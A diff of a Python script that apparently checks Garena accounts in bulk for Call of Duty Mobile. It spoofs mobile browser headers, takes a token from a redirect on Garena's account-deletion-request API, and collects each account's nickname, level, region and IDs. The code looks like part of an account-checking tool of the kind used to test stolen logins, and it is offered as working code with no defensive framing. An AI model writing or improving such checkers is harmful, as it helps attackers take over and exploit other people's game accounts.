+            "user-agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
+        }
+        
+        api_callback_response = session.get(api_callback_url, headers=api_callback_headers, allow_redirects=False)
+        location = api_callback_response.headers.get("Location", "")
+        
+        if "err=3" in location:
+            return None, "no_codm"
+        elif "token=" in location:
+            token = location.split("token=")[-1].split('&')[0]
+            return token, "success"
         else:
-            return {}
+            return None, "unknown_error"
             
     except Exception as e:
-        logger.error(f'Error getting CODM user info: {e}')
+        logger.error(f"[ERROR] Error processing CODM callback: {e}")
+        return None, "error"
+
+
+def get_codm_user_info(session, token):
+    try:
+        check_login_url = "https://api-delete-request.codm.garena.co.id/oauth/check_login/"
+        check_headers = {
+            "authority": "api-delete-request.codm.garena.co.id",
+            "accept": "application/json, text/plain, */*",
+            "accept-language": "en-US,en;q=0.9",
+            "accept-encoding": "gzip, deflate, br, zstd",
+            "cache-control": "no-cache",
+            "codm-delete-token": token,
+            "origin": "https://delete-request.codm.garena.co.id",
+            "pragma": "no-cache",
+            "referer": "https://delete-request.codm.garena.co.id/",
+            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v=\"24"',
+            "sec-ch-ua-mobile": "?1",
+            "sec-ch-ua-platform": '"Android"',
+            "sec-fetch-dest": "empty",
+            "sec-fetch-mode": "cors",
+            "sec-fetch-site": "same-site",
+            "user-agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
+            "x-requested-with": "XMLHttpRequest"
+        }
+        
+        check_response = session.get(check_login_url, headers=check_headers)
+        check_data = check_response.json()
+        
+        user_data = check_data.get("user", {})
+        if user_data:
+            return {
+                "codm_nickname": user_data.get("codm_nickname", "N/A"),
+                "codm_level": user_data.get("codm_level", "N/A"),
+                "region": user_data.get("region", "N/A"),
+                "uid": user_data.get("uid", "N/A"),
+                "open_id": user_data.get("open_id", "N/A"),
+                "t_open_id": user_data.get("t_open_id", "N/A")
+            }
+        return {}
+        
+    except Exception as e:
+        logger.error(f" Error getting CODM user info: {e}")
         return {}
 
 def check_codm_account(session, account):
@@ -1014,12 +1234,12 @@ def check_codm_account(session, account):
     codm_info = {}
     has_codm = False
     try:
-        access_token, open_id, uid = get_codm_access_token(session)
+        access_token = get_codm_access_token(session)
         if not access_token:
             logger.warning('      └─ ⚠️ No CODM access token')
             return (has_codm, codm_info)
         else:
-            codm_token, status = process_codm_callback(session, access_token, open_id, uid)
+            codm_token, status = process_codm_callback(session, access_token)
             if status == 'no_codm':
                 logger.info('      └─ 📭 No CODM detected')
                 return (has_codm, codm_info)
